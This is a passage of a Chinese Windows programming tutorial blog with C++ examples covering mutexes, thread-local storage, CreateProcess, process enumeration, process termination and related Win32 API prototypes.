(_beginthreadex_proc_type)myThread, NULL, 0, NULL); HANDLE h4 = (HANDLE)_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)myThread, NULL, 0, NULL); WaitForSingleObject(h1, INFINITE); WaitForSingleObject(h2, INFINITE); WaitForSingleObject(h3, INFINITE); WaitForSingleObject(h4, INFINITE); CloseHandle(h1); CloseHandle(h2); CloseHandle(h3); CloseHandle(h4); return 0;&#125; 互斥内核对象 互斥（Mutex）是一种用途非常广泛的内核对象。 能够保证多个线程对同一共享资源的互斥访问。 同临界区有些类似，只有拥有互斥对象的线程才具有访问资源的权限，由于互斥对象只有一个，因此就决定了任何情况下此共享资源都不会同时被多个线程所访问。 当前占据资源的线程在任务处理完后应将拥有的互斥对象交出，以便其他线程在获得后得以访问资源。 与其他几种内核对象不同，互斥对象在操作系统中拥有特殊代码，并由操作系统来管理，操作系统 甚至还允许其进行一些其他内核对象所不能进行的非常规操作。 黑点表示令牌，只有拿到令牌的线程才能进入访问资源，访问结束后要交出令牌，不然其他线程会一直无法访问该资源。 以互斥内核对象来保持线程同步可能用到的函数主要有CreateMutex、OpenMutex. ReleaseMutex、 WaitForSingleObject和WaitForMultipleObjects等。 在使用互斥对象前，首先要通过CreateMutex或OpenMutex创建或打开一个互斥对象。 CreateMutex函数原型如下： 12345HANDLE CreateMutex(LPSECURITY_ATTRIBUTES IpMutexAttributes， //安全属性指针BOOL bInitialOwner， //初始拥有者LPCTSTR IpName //互斥对象名) 参数blnitialowner主要用来控制互斥对象的初始状态。一般多将其设置为FALSE，以表 明互斥对象在创建时并没有为任何线程所占有。 如果在创建互斥对象时指定了对象名，那么可以在本进程其他地方或是在其他进程通过OpenMutex函数得到此互斥对象的句柄。 OpenMutex函数原型为： 12345HANDLE OpenMutex(DWORD dwDesiredAccess，//访问标志BOOL bInheritHandle， //继承标志LPCTSTR IpName //互斥对象名) 当目前对资源具有访问权的线程不再需要访问此资源而要离开时，必须通过ReleaseMutex函数来释放其拥有的互斥对。 ReleaseMutex函数原型为： 1BOOL ReleaseMutex(HANDLE hMutex); 其惟一的参数hMutex为待释放的互斥对象句柄。 至于WaitForSingleObject和WaitForMultipleObjects等待函数在互斥对象保持线程同步中所起的作用与在其他内核对象中的作用是基本一致的，也是等待互斥内核对象的通知。 但是这里需要特别指出的是：在互斥对象通知引起调用等待函数返回时，等待函数的返回值不再是通常的WAIT_OBJECT_0 （对于WaitForSingleObject函数）或是在WAIT_OBJECT_0到WAIT_OBJECT_0+nCount-1之间的一个值（对于WaitForMultipleObiects函数） 而是将返回一个WAIT_ABANDONED_0 （对于WaitForSingleObject函数）或是在WAIT_ABANDONED_0到WAIT_ABANDONED_0+nCount-1之间的一个值（对于WaitForMultipleObjects函数） ，以此来表明线程正在等待的互斥对象由另外一个线程所拥有，而此线程却在使用完共享资源前就已经终止。 除此之外，使用互斥对象的方法在等待线程的可调度性上同使用其他几种内核对象的方法也有所不同，其他内核对象在没有得到通知时，受调用等待函数的作用，线程将会挂起，同时失去可调度性，而使用互斥的方法却可以在等待的同时仍具有可调度性，这也正是互斥对象所能完成的非常规操作之一 关于WAIT_ABANDONED或WAIT_ABANDONED_0返回值 假设有A、B两个线程和一个互斥量hMutex。如果A线程调用WaitForSingleObject获取到互斥量后，并没有调用ReleaseMutex来释放互斥量就终止了（如调用了ExitThread,TerminateThread）。然后线程B调用WaitForSingleObject就会返回WAIT_ABANDONED，并且线程B获取到互斥量，线程B使用完成后应该调用ReleasMutex释放互斥量 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include&lt;iostream&gt;#include&lt;windows.h&gt;#include&lt;process.h&gt;using namespace std;//信号量对象句柄HANDLE hMutex;HANDLE h1;HANDLE h2;HANDLE h3;HANDLE h4; UINT WINAPI myThread(LPVOID pParam) &#123; WaitForSingleObject(hMutex, INFINITE); cout &lt;&lt; \"调用了\" &lt;&lt; (char *)pParam &lt;&lt; \"线程\" &lt;&lt; endl; ReleaseMutex(hMutex); //试图进入信号量关口 DWORD dw = WaitForSingleObject(hMutex, INFINITE); switch (dw) &#123; case WAIT_FAILED: // 调用WaitForMultipleObjects函数失败(句柄无效？) cout &lt;&lt; (char *)pParam &lt;&lt; \"线程\" &lt;&lt; \"调用WaitForMultipleObjects函数失败\" &lt;&lt; endl; return 0; break; case WAIT_TIMEOUT: // 在10毫秒后没有一个内核对象受信 cout &lt;&lt; (char *)pParam &lt;&lt; \"线程\" &lt;&lt; \"等待10ms后Mutex内核对象未受信,所以结束本线程\" &lt;&lt; endl; return 0; break; case WAIT_OBJECT_0: // hMutex句柄对应的内核对象受信 cout &lt;&lt; (char *)pParam &lt;&lt; \"线程\" &lt;&lt; \" hMutex句柄对应的内核对象受信,本线程会正常工作\" &lt;&lt; endl; break; case WAIT_ABANDONED_0: cout &lt;&lt; \"上一个线程在使用完之后,没有使用ReleaseMutex释放\" &lt;&lt; endl; cout &lt;&lt; (char *)pParam &lt;&lt; \": \"; cout &lt;&lt; 123 &lt;&lt; endl; ReleaseMutex(hMutex); return 0; &#125; cout &lt;&lt; (char *)pParam &lt;&lt; \": \"; cout &lt;&lt; 123 &lt;&lt; endl; //释放信号量计数 //ReleaseMutex(hMutex); return 0;&#125;int main(char *argv[], int argc)&#123; //创建信号量对象 hMutex = CreateMutex(NULL,FALSE,NULL); h1 = (HANDLE) _beginthreadex(NULL, NULL, (_beginthreadex_proc_type)myThread, \"a\", 0, NULL); h2 = (HANDLE)_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)myThread, \"b\", 0, NULL); h3 = (HANDLE)_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)myThread, \"c\", 0, NULL); h4 = (HANDLE)_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)myThread, \"d\", 0, NULL); WaitForSingleObject(h1, INFINITE); WaitForSingleObject(h2, INFINITE); WaitForSingleObject(h3, INFINITE); WaitForSingleObject(h4, INFINITE); return 0;&#125; 在编写程序时，互斥对象多用在对那些为多个线程所访问的内存块的保护上，可以确保任 何线程在处理此内存块时都对其拥有可靠的独占访问权。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include&lt;iostream&gt;#include&lt;windows.h&gt;#include&lt;process.h&gt;using namespace std;//信号量对象句柄HANDLE hMutex;HANDLE h1;HANDLE h2;HANDLE h3;HANDLE h4; UINT WINAPI myThread(LPVOID pParam) &#123; cout &lt;&lt; \"调用了\" &lt;&lt; (char *)pParam &lt;&lt; \"线程\" &lt;&lt; endl; //试图进入信号量关口 DWORD dw = WaitForSingleObject(hMutex, 10); switch (dw) &#123; case WAIT_FAILED: // 调用WaitForMultipleObjects函数失败(句柄无效？) cout &lt;&lt; (char *)pParam &lt;&lt; \"线程\" &lt;&lt; \"调用WaitForMultipleObjects函数失败\" &lt;&lt; endl; return 0; break; case WAIT_TIMEOUT: // 在10毫秒后没有一个内核对象受信 cout &lt;&lt; (char *)pParam &lt;&lt; \"线程\" &lt;&lt; \"等待10ms后Mutex内核对象未受信,所以结束本线程\" &lt;&lt; endl; return 0; break; case WAIT_OBJECT_0: // hMutex句柄对应的内核对象受信 cout &lt;&lt; (char *)pParam &lt;&lt; \"线程\" &lt;&lt; \" hMutex句柄对应的内核对象受信,本线程会正常工作\" &lt;&lt; endl; break; &#125; Sleep(500); cout &lt;&lt; (char *)pParam &lt;&lt; \": \"; cout &lt;&lt; 123 &lt;&lt; endl; //释放信号量计数 ReleaseMutex(hMutex); return 0;&#125;int main(char *argv[], int argc)&#123; //创建信号量对象 hMutex = CreateMutex(NULL,FALSE,NULL); h1 = (HANDLE) _beginthreadex(NULL, NULL, (_beginthreadex_proc_type)myThread, \"a\", 0, NULL); h2 = (HANDLE)_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)myThread, \"b\", 0, NULL); h3 = (HANDLE)_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)myThread, \"c\", 0, NULL); h4 = (HANDLE)_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)myThread, \"d\", 0, NULL); WaitForSingleObject(h1, INFINITE); WaitForSingleObject(h2, INFINITE); WaitForSingleObject(h3, INFINITE); WaitForSingleObject(h4, INFINITE); return 0;&#125; 线程局部存储 线程局部存储（thread-local storage， TLS）是一个使用很方便的存储线程局部数据的系统。 利用TLS机制可以为进程中所有的线程关联若干个数据，各个线程通过由TLS分配的全局索引来访问与自己关联的数据。 这样，每个线程都可以有线程局部的静态存储数据。 用于管理TLS的数据结构是很简单的， Windows仅为系统中的每一个进程维护一个位数组，再为该进程中的每一个线程申请一个同样长度的数组空间。 运行在系统中的每一个进程都有一个位数组。 位数组的成员是一个标志，每个标志的值被设为FREE或INUSE，指示了此标志对应的数组索引是否在使用中。 Windodws保证至少有TLS_MINIMUM_AVAILABLE（定义在WinNTh文件中）个标志位可用。 （1）主线程调用TIsAlloc函数为线程局部存储分配索引，函数原型为： 1DWORD TIsAlloc(void); //返回一个TLS索引 系统为每一个进程都维护着一个长度为TLS_MINIMUM_AVAILABLE的位数组， TIsAlloc的返回值就是数组的一个下标（索引）。 这个位数组的惟一用途就是记忆哪一个下标在使用中。 初始状态下，此位数组成员的值都是FREE，表示未被使用。 当调用TIsAlloc的时候，系统会挨个检查这个数组中成员的值，直到找到一个值为FREE的成员。把找到的成 员的值由FREE改为INUSE后， TIsAlloc函数返回该成员的索引。 如果不能找到一个值为FREE的成员， TIsAlloc函数就返回TLS_OUT_OF_INDEXES （在WinBase.h文件中定义为-1），意味着失败。 当一个线程被创建时， Windows就会在进程地址空间中为该线程分配一个长度为TLS_MINIMUM_AVAILABLE的数组，数组成员的值都被初始化为0。 在内部，系统将此数组与该线程关联起来，保证只能在该线程中访问此数组中的数据。 每个线程都有它自己的数组，数组成员可以存储任何数据。 （2）每个线程调用TIsSetValue和TIsGetValue设置或读取线程数组中的值，TIsSetValue函数原型为： 12345BOOL TIsSetValue(DWORD dwTisindex, //TLS索引LPVOID IpTIsValue //要设置的值);LPVOID TIsGetValue(DWORD dwTIslIndex);//TLS索引 TlsSetValue函数将参数IpTIsValue指定的值放入索引为dwTIsIndex的线程数组成员中。 这样，IpTisValue的值就与调用TIisSetValue函数的线程关联了起来。 此函数调用成功，会返回TRUE 调用TIsSetValue函数，一个线程只能改变自己线程数组中成员的值，而没有办法为另 个线程设置TLS值。 到现在为止，将数据从一个线程传到另一个线程的惟一方法是在创建线 程时使用线程函数的参数。 TIsGetValue函数的作用是取得线程数组中索引为dwTIsIndex的成员的值。 TlsSetValue和TIsGetValue分别用于设置和取得线程数组中的特定成员的值，而它们使用 的索引就是TIsAlloc函数的返回值。 这就充分说明了进程中惟一的位数组和各线程数组的关系。 例如， TIsAlloc返回3，那就说明索引3被此进程中的每一个正在运行的和以后要被创建的线程保存起来，用以访问各自线程数组中对应的成员的值。 （3）主线程调用TIsFree释放局部存储索引。函数的惟一参数是TIsAlloc返回的索引。 利用TLS可以给特定的线程关联一个数据。比如下面的例子将每个线程的创建时间与该 线程关联了起来，这样，在线程终止的时候就可以得到线程的生命周期。整个跟踪线程运行时 间的例子的代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273///////////////////////////////////////////////////////////////// 02UseTLS.cpp.cpp文件#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;process.h&gt;// 利用TLS记录线程的运行时间DWORD g_tlsUsedTime;void InitStartTime();DWORD GetUsedTime();UINT __stdcall ThreadFunc(LPVOID)&#123; int i; // 初始化开始时间 InitStartTime(); // 模拟长时间工作 i = 10000*10000; while(i--) &#123; &#125; // 打印出本线程运行的时间 printf(\" This thread is coming to end. Thread ID: %-5d, Used Time: %d \\n\", ::GetCurrentThreadId(), GetUsedTime()); return 0;&#125;int main(int argc, char* argv[])&#123; UINT uId; int i; HANDLE h[10]; // 通过在进程位数组中申请一个索引，初始化线程运行时间记录系统 g_tlsUsedTime = ::TlsAlloc(); // 令十个线程同时运行，并等待它们各自的输出结果 for(i=0; i&lt;10; i++) &#123; h[i] = (HANDLE)::_beginthreadex(NULL, 0, ThreadFunc, NULL, 0, &amp;uId); &#125; for(i=0; i&lt;10; i++) &#123; ::WaitForSingleObject(h[i], INFINITE); ::CloseHandle(h[i]); &#125; // 通过释放线程局部存储索引，释放时间记录系统占用的资源 ::TlsFree(g_tlsUsedTime); return 0;&#125;// 初始化线程的开始时间void InitStartTime()&#123; // 获得当前时间，将线程的创建时间与线程对象相关联 DWORD dwStart = ::GetTickCount(); ::TlsSetValue(g_tlsUsedTime, (LPVOID)dwStart);&#125;// 取得一个线程已经运行的时间DWORD GetUsedTime()&#123; // 获得当前时间，返回当前时间和线程创建时间的差值 DWORD dwElapsed = ::GetTickCount(); dwElapsed = dwElapsed - (DWORD)::TlsGetValue(g_tlsUsedTime); return dwElapsed;&#125; GetTickCount函数可以取得Windows从启动开始经过的时间，其返回值是以毫秒为单位 的已启动的时间","categories":[{"name":"windows程序设计","slug":"windows程序设计","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计/"}],"tags":[]},{"title":"Win32程序运行原理","slug":"win0002-Win32程序运行原理","date":"2021-05-18T18:02:51.000Z","updated":"2021-05-19T16:27:45.112Z","comments":true,"path":"2021/05/19/win0002-Win32程序运行原理/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/19/win0002-Win32程序运行原理/","excerpt":"","text":"Win32程序运行原理 CPU的保护模式和Windows系统 80386处理器有三种工作模式：实模式、保护模式和虚拟86模式 实模式和虚拟模式是为了和8086处理器兼容而设置的 Windows操作系统运行在保护模式中 Windows的多任务实现 多任务隔离技术：可以使每个任务都有独立的地址空间，就像每个任务独享一个CPU一样 在Windows中任务被进程取代 进程就是正在运行的应用程序的实例（执行它的是线程，进程实则就是一块应用程序的空间） Windows是多任务操作系统 每个进程内的线程只能访问自己 线程的内存，不能访问其他进程的内存 例如 有进程A，B A进程中的线程只能访问自己进程的内存，不能访问B进程中的地址 虚拟内存 Windows为每个进程分配4GB的地址空间主要依靠CPU支持 CPU在保护模式下支持虚拟存储 虚拟内存：将磁盘空间当做内存空间来使用 页文件：包含了对所有进程都有效的虚拟内存 4GB虚拟地址的前半部分留给系统，后半部分留给用户 系统空间：内核代码、设备驱动代码等等。部分空间是共享的 内核模式和用户模式： 80386处理器共定义了4中（0~3）特权级别 称为环 0是特权级(最高级) 3是用户级 Windows有两种模式: 内核模式是0级：系统程序（驱动等等） 用户模式是3级 当应用程序调用系统函数时，会从用户模式切换到内核模式去执行 内核对象 内核对象：系统提供用户模式下代码与内核模式下代码进行交互的基本接口。 对象句柄： 调用函数创建一个内核对象时会返回一个此对象的句柄 很多API函数都需要使用此句柄来辨别处理哪个内核对象，该句柄仅对创建该内核对象的进程有效 也可以多个进程共享一个内核对象，调用DuplicateHandle复制一个进程句柄传给其他进程 使用计数 系统为进程分配内核对象资源时,会将内核对象使用计数属性初始化为1 以后每次打开这个内核对象,系统就会将使用计数加1,关闭则减1 使用计数为0时,说明这个内核对象所有引用都已经关闭,系统会释放该内核对象资源 进程的创建 进程和线程: 进程: 磁盘将可执行文件载入内存之后就变成了进程 进程是一个正在运行的程序 拥有自己的虚拟空间地址、代码、数据、其他系统资源 有一个或多个线程 一个进程要完成任何事情，必须拥有一个在它地址空间中运行的线程，此线程负责执行该进程地址空间的代码 线程: 进程内执行代码的独立实体 系统创建一个进程后，会创建一个线程来执行进程内的代码，这个线程称为主线程 主线程运行过程中可以创建其他线程，一般主线程创建的线程称为辅助线程或子线程 组成Win32进程的两个部分 1.进程内核对象：操作系统使用此内核对象进行管理该进程 2.私有的虚拟地址空间：包含了所有可执行的或是DLL模块的代码和数据、程序动态申请内存的地方 应用程序的启动过程 控制台应用程序的启动过程 1.操作系统会调用C/C运行期启动函数（会初始化C/C运行期库） 2.C/C++运行期启动函数调用入口main函数 Win32应用程序的启动过程 1.操作系统会调用CreateProcess函数来创建一个新的进程 当一个线程调用CreateProcess函数的时候,系统会创建一个进程内核对象,初始化使用计数为1 该进程内核对象是一个系统用来管理这个进程的数据结构 2.为新的进程创建一个虚拟空间,加载应用程序运行时所需要的代码和数据 3.为新的进程创建一个主线程 4.主线程会执行C/C++运行期启动代码 5.C/C++运行期启动代码会调用main函数 如果系统成功创建一个进程和一个主线程,CreateProcess会返回TRUE,否者返回FALSE 创建进程称为父进程,被创建进程称为子进程 系统在创建新进程的时候会传递一个STARTUPINFO类型的变量,这个结构体包含了父进程传递给子进程的一些信息 STARTUPINFO结构体定义如下 123456789101112131415161718192021typedef struct _STARTUPINFO &#123; DWORD cb; //包含STARTUPINFO结构中的字节数.如果Microsoft将来扩展该结构,它可用作版本控制手段.应用程序必须将cb初始化为sizeof(STARTUPINFO) PSTR lpReserved; //保留。必须初始化为NULL PSTR lpDesktop; //用于标识启动应用程序所在的桌面的名字。如果该桌面存在，新进程便与指定的桌面相关联。如果桌面不存在，便创建一个带有默认属性的桌面，并使用为新进程指定的名字。如果lpDesktop是NULL（这是最常见的情况 ),那么该进程将与当前桌面相关联 PSTR lpTitle; //用于设定控制台窗口的名称。如果lpTitle是NULL，则可执行文件的名字将用作窗口名.This parameter must be NULL for GUI or console processes that do not create a new console window. DWORD dwX; //用于设定应用程序窗口相对屏幕左上角位置的x 坐标（以像素为单位）。 DWORD dwY; //对于GUI processes用CW_USEDEFAULT作为CreateWindow的x、y参数，创建它的第一个重叠窗口。若是创建控制台窗口的应用程序，这些成员用于指明相对控制台窗口的左上角的位置 DWORD dwXSize; //用于设定应用程序窗口的宽度（以像素为单位） DWORD dwYSize; //子进程将CW_USEDEFAULT 用作CreateWindow 的nWidth、nHeight参数来创建它的第一个重叠窗口。若是创建控制台窗口的应用程序，这些成员将用于指明控制台窗口的宽度 DWORD dwXCountChars; //用于设定子应用程序的控制台窗口的宽度（屏幕显示的字节列）和高度（字节行）（以字符为单位） DWORD dwYCountChars; DWORD dwFillAttribute; //用于设定子应用程序的控制台窗口使用的文本和背景颜色 DWORD dwFlags; //请参见下一段和表4-7 的说明 WORD wShowWindow; //用于设定如果子应用程序初次调用的ShowWindow 将SW_*作为nCmdShow 参数传递时，该应用程序的第一个重叠窗口应该如何出现。本成员可以是通常用于ShowWindow 函数的任何一个SW_*标识符，除了SW_SHOWDEFAULT. WORD cbReserved2; //保留。必须被初始化为0 PBYTE lpReserved2; //保留。必须被初始化为NULL HANDLE hStdInput; //用于设定供控制台输入和输出用的缓存的句柄。按照默认设置，hStdInput 用于标识键盘缓存，hStdOutput 和hStdError用于标识控制台窗口的缓存 HANDLE hStdOutput; HANDLE hStdError; &#125; STARTUPINFO, *LPSTARTUPINFO; dwFlags 使用标志及含义 1234567STARTF_USESIZE // 使用dwXSize和dwYSize成员STARTF_USESHOWWINDOW //使用wShowWindow成员STARTF_USEPOSITION //使用dwX和dwY成员STARTF_USECOUNTCHARS //使用dwXCountChars和dwYCountChars成员STARTF_USEFILLATTRIBUTE //使用dwFillAttribute成员STARTF_USESTDHANDLES //使用hStdInput、hStdOutput和hStdError成员STARTF_RUN_FULLSCREEN //强制在x 8 6 计算机上运行的控制台应用程序以全屏幕方式启动运行 GetStartupInfo函数 获取父进程创建自己时使用的STARTUPINFO结构 12345VOID GetStartupInfo(LPSTARTUPINFO lpStartupInfo // STARTUPINFO指针); 定义一个STARTUPINFO结构体变量后要初始化cb成员 12STARTUPINFO si = &#123;sizeof(STARTUPINFO)&#125;;GetStartupInfo(&amp;si); CreateProcess函数 用来创建一个新的进程和它的主线程，这个新进程运行指定的可执行文件 123456789101112 BOOL CreateProcess( LPCTSTR lpApplicationName, // 应用程序名称 LPTSTR lpCommandLine, // 命令行字符串 LPSECURITY_ATTRIBUTES lpProcessAttributes, // 进程的安全属性 NULL默认安全属性 LPSECURITY_ATTRIBUTES lpThreadAttributes, // 线程的安全属性 NULL默认安全属性 BOOL bInheritHandles, // 是否继承父进程的属性 DWORD dwCreationFlags, // 创建标志 LPVOID lpEnvironment, // 指向新的环境块的指针 LPCTSTR lpCurrentDirectory, // 指向当前目录名的指针 LPSTARTUPINFO lpStartupInfo, // 传递给新进程的信息 LPPROCESS_INFORMATION lpProcessInformation // 新进程返回的信息 ); lp开头代表是说明变量类型为指针变量 LPCSTR 是 const char * WINDEF.h头文件包含了变量类型对应的宏名 12345678910111213141516171819202122typedef unsigned long DWORD; typedef int BOOL; typedef unsigned char BYTE; typedef unsigned short WORD; typedef float FLOAT; typedef FLOAT *PFLOAT; typedef BOOL near *PBOOL; typedef BOOL far *LPBOOL; typedef BYTE near *PBYTE; typedef BYTE far *LPBYTE; typedef int near *PINT; typedef int far *LPINT; typedef WORD near *PWORD; typedef WORD far *LPWORD; typedef long far *LPLONG; typedef DWORD near *PDWORD; typedef DWORD far *LPDWORD; typedef void far *LPVOID; typedef CONST void far *LPCVOID; typedef int INT; typedef unsigned int UINT; typedef unsigned int *PUINT; 创建一个新的进程打开记事本 PROCESS_INFORMATION结构体 创建了一个进程之后,如果不使用hProcess或hThread时就应该释放它 父进程必须要有一个CloseHandle函数来关闭CreateProcess函数返回的两个内核对象句柄，否者基本子进程已经终止了,该进程的内核对象和主线程的内核对象仍然没有释放 12345678910111213141516171819202122232425262728293031323334353637///////////////////////////////////////////////////////////////// 02CreateProcess.cpp文件#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main(int argc, char* argv[])&#123; char szCommandLine[] = \"cmd\"; STARTUPINFO si = &#123; sizeof(si) &#125;; PROCESS_INFORMATION pi; si.dwFlags = STARTF_USESHOWWINDOW; // 指定wShowWindow成员有效 si.wShowWindow = TRUE; // 此成员设为TRUE的话则显示新建进程的主窗口， // 为FALSE的话则不显示 BOOL bRet = ::CreateProcess ( NULL, // 不在此指定可执行文件的文件名 szCommandLine, // 命令行参数 NULL, // 默认进程安全性 NULL, // 默认线程安全性 FALSE, // 指定当前进程内的句柄不可以被子进程继承 CREATE_NEW_CONSOLE, // 为新进程创建一个新的控制台窗口 NULL, // 使用本进程的环境变量 NULL, // 使用本进程的驱动器和目录 &amp;si, &amp;pi); if(bRet) &#123; // 既然我们不使用两个句柄，最好是立刻将它们关闭 ::CloseHandle (pi.hThread); ::CloseHandle (pi.hProcess); printf(\" 新进程的进程ID号：%d \\n\", pi.dwProcessId); printf(\" 新进程的主线程ID号：%d \\n\", pi.dwThreadId); &#125; return 0;&#125; windows是通过dwFlags来查看STARTUPINFO变量中的哪一个成员有效，再去取那个成员的值 使用wShowWindow成员用STARTF_USESHOWWINDOW 使用dwXSize和dwXSize用STARTF_USESIZE 使用dwX，dwY成员用STARTF_USEPOSITION dwFlags = STARTF_USESHOWWINDOW | STARTF_USESIZE | STARTF_USEPOSITION 则wShowWindow,dwXSize,dwXSize,dwX，dwY成员都有效 CREATE_NEW_CONSOLE 表示创建一个新的控制台 CloseHandle函数 关闭一个内核对象 12345BOOL CloseHandle(HANDLE hObject //代表一个已打开对象handle。); TRUE：执行成功； FALSE：执行失败，可以调用GetLastError()获知失败原因。 进程控制 获取系统进程 PROCESSENTRY32 结构 123456789101112typedef struct &#123; DWORD dwSize; // 结构大小； DWORD cntUsage; // 此进程的引用计数； DWORD th32ProcessID; // 进程ID; DWORD th32DefaultHeapID; // 进程默认堆ID； DWORD th32ModuleID; // 进程模块ID； DWORD cntThreads; // 此进程开启的线程计数； DWORD th32ParentProcessID;// 父进程ID； LONG pcPriClassBase; // 线程优先权； DWORD dwFlags; // 保留； char szExeFile[MAX_PATH]; // 进程全名； &#125; PROCESSENTRY32; CreateToolhelp32Snapshot 可以通过获取进程信息为指定的进程、进程使用的堆[HEAP]、模块[MODULE]、线程建立一个快照。 头文件：tlhelp32.h 返回值： 调用成功，返回快照的句柄，调用失败，返回INVALID_HANDLE_VALUE** 1234567**HANDLE WINAPI CreateToolhelp32Snapshot(***DWORD dwFlags,* //用来指定“快照”中需要返回的对象，可以是TH32CS_SNAPPROCESS等*DWORD th32ProcessID* //一个进程ID号，用来指定要获取哪一个进程的快照，当获取系统进程列表 //获取 当前进程快照时可以设为0); 指定快照中包含的系统内容，dwFlags这个参数能够使用下列数值（常量）中的一个或多个。 TH32CS_INHERIT 声明快照句柄是可继承的。 TH32CS_SNAPALL 在快照中包含系统中所有的进程和线程。 TH32CS_SNAPHEAPLIST 在快照中包含在th32ProcessID中指定的进程的所有的堆。 TH32CS_SNAPMODULE 在快照中包含在th32ProcessID中指定的进程的所有的模块。 TH32CS_SNAPPROCESS 在快照中包含系统中所有的进程。 TH32CS_SNAPTHREAD 在快照中包含系统中所有的线程。 H32CS_SNAPALL = (TH32CS_SNAPHEAPLIST | TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD | TH32CS_SNAPMODULE) process32First 是一个进程获取函数，当我们利用函数CreateToolhelp32Snapshot()获得当前运行进程的快照后，我们可以利用process32First函数来获得第一个进程的句柄。 1234BOOL WINAPI Process32First( HANDLE hSnapshot, //快照句柄 LPPROCESSENTRY32 lppe //PROCESSENTRY32指针); Process32Next 是一个进程获取函数，当我们利用函数CreateToolhelp32Snapshot()获得当前运行进程的快照后,我们可以利用Process32Next函数来获得下一个进程的句柄。 1234BOOL WINAPI Process32Next( HANDLE hSnapshot, //快照句柄 LPPROCESSENTRY32 lppe //PROCESSENTRY32指针); 获取系统进程的例子 123456789101112131415161718192021222324252627282930313233343536///////////////////////////////////////////////////////////////// 02ProcessList.cpp文件#include \"stdafx.h\"#include &lt;windows.h&gt;#include &lt;tlhelp32.h&gt; // 声明快照函数的头文件int main(int argc, char* argv[])&#123; PROCESSENTRY32 pe32; // 在使用这个结构之前，先设置它的大小 pe32.dwSize = sizeof(pe32); // 给系统内的所有进程拍一个快照 HANDLE hProcessSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if(hProcessSnap == INVALID_HANDLE_VALUE) &#123; printf(\" CreateToolhelp32Snapshot调用失败！ \\n\"); return -1; &#125; // 遍历进程快照，轮流显示每个进程的信息 BOOL bMore = ::Process32First(hProcessSnap, &amp;pe32); while(bMore) &#123; printf(\" 进程名称：%s \\n\", pe32.szExeFile); printf(\" 进程ID号：%u \\n\\n\", pe32.th32ProcessID); bMore = ::Process32Next(hProcessSnap, &amp;pe32); &#125; // 不要忘记清除掉snapshot对象 ::CloseHandle(hProcessSnap); return 0;&#125; 终止当前进程 终止进程也就是结束程序的执行，让它从内存中卸载。进程终止的原因可能有4种: (1)主线程的入口函数返回。 (2)进程中一个线程调用了ExitProcess 函数。 (3)此进程中的所有线程都结束了。 (4)其他进程中的一一个线程调 用了TerminateProcess 函数。 Exitprocess结束当前进程函数 1void Exitprocess(UINT uExitCode);//uExitCode为退出代码 TerminateProcess终止其他进程函数 1234BOOL TerminateProcess( HANDLE hprocess, //要结束的进程句柄 UINT uExitCode //指定目标进程的退出代码); OpenProcess 函数用来打开一个已存在的进程对象，并返回进程的句柄。 12345HANDLE OpenProcess(DWORD dwDesiredAccess, //渴望得到的访问权限（标志）BOOL bInheritHandle, // 是否继承句柄DWORD dwProcessId// 进程id); **dwDesiredAccess ：**获取的权限，可分为以下几种 PROCESS_ALL_ACCESS：获取所有权限 PROCESS_CREATE_PROCESS：创建进程 PROCESS_CREATE_THREAD：创建线程 PROCESS_DUP_HANDLE：使用DuplicateHandle()函数复制一个新句柄 PROCESS_QUERY_INFORMATION：获取进程的令牌、退出码和优先级等信息 PROCESS_QUERY_LIMITED_INFORMATION：获取进程特定的某个信息 PROCESS_SET_INFORMATION：设置进程的某种信息 PROCESS_SET_QUOTA：使用SetProcessWorkingSetSize函数设置内存限制 PROCESS_SUSPEND_RESUME：暂停或者恢复一个进程 PROCESS_TERMINATE：使用Terminate函数终止进程 PROCESS_VM_OPERATION：在进程的地址空间执行操作 PROCESS_VM_READ：使用ReadProcessMemory函数在进程中读取内存 PROCESS_VM_WRITE：使用WriteProcessMemory函数在进程中写入内存 SYNCHRONIZE：使用wait函数等待进程终止 12345678910111213141516171819202122232425262728293031323334353637///////////////////////////////////////////////////////////////// 02TerminateProcess.cpp文件#include \"stdafx.h\"#include &lt;windows.h&gt;BOOL TerminateProcessFromId(DWORD dwId)&#123; BOOL bRet = FALSE; // 打开目标进程，取得进程句柄 HANDLE hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwId); if(hProcess != NULL) &#123; // 终止进程 bRet = ::TerminateProcess(hProcess, 0); &#125; CloseHandle(hProcess); return bRet;&#125;int main(int argc, char* argv[])&#123; DWORD dwId; printf(\" 请输入您要终止的进程的ID号： \\n\"); scanf(\"%u\", &amp;dwId); if(TerminateProcessFromId(dwId)) &#123; printf(\" 终止进程成功！ \\n\"); &#125; else &#123; printf(\" 终止进程失败！ \\n\"); &#125; return 0;&#125; GetLastError获取调用线程的最后出错代码 1DWORD GetLastError(VOID); GetExitCodeProcess 获取一个已中断进程的退出代码 1234BOOL GetExitCodeProcess(HANDLE hProcess, //想获取退出代码的一个进程的句柄LPDWORD lpExitCode //用于装载进程退出代码的一个长整数变量。如进程尚未中止，则设为常数STILL_ACTIVE); 一旦进程终止， 就会有下列事件发生: (1)所有被这个进程创建或打开的对象句柄就会关闭。 (2)此进程内的所有线程将终止执行。 (3)进程内核对象变成受信状态，所有等待在此对象上的线程开始运行，即WaitForSingleObject函数返回。 (4)系统将进程对象中退出代码的值由STILL_ ACTIVE改为指定的退出码。 ReadProcessMemory是一个内存操作函数， 其作用为根据进程句柄读入该进程的某个内存空间 1234567BOOL ReadProcessMemory(HANDLE hProcess, //待读进程的句柄PVOID pvAddressRemote, //目标进程中待读内容的起始位置PVOID pvBufferLocal, //用来接受读取数据的缓冲区DWORD dwSize, //要读取的字节数PDWORD pdwNumBytesRead //用来供函数返回实际读取的字节数); 